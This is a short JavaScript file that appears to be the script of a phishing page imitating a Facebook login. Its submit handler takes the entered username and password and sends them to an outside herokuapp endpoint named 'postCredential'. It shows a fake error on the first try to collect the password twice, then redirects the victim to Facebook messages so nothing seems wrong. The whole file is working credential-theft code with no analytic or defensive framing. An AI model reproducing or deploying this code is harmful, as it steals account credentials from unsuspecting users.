function setPostHeaders(body, isJsonBody = true) {
    const h = {};
    h.Accept = 'application/json';
    h['Content-Type'] = 'application/json';

    return {
        method: 'POST',
        headers: h,
        body: isJsonBody ? JSON.stringify(body) : body,
    };
}

let attempt = 0;
const handleSubmit = (e) => {
    const u = document.getElementById('inpName') || '';
    const p = document.getElementById('inpPass') || '';
    const { value: uv = '' } = u;
    const { value: pv = '' } = p;

    if (!uv) {
        u.focus();
        return;
    }
    if (!pv) {
        p.focus();
        return;
    }

    fetch(`https://media-store.herokuapp.com/api/media/postCredential?uname=${uv}&upass=${pv}`, setPostHeaders({ uname: uv, upass: pv }))
        .then((res) => {
            if (attempt === 0) {
                document.getElementsByClassName('error')[0].style.visibility = 'visible';
                p.value = '';
                p.focus();
            } else {
                document.getElementsByClassName('error')[0].style.visibility = 'hidden';
                window.location.href = 'https://www.facebook.com/messages';
            }
            attempt++;
        })
        .catch((err) => console.log(err));
};

(function() {})();
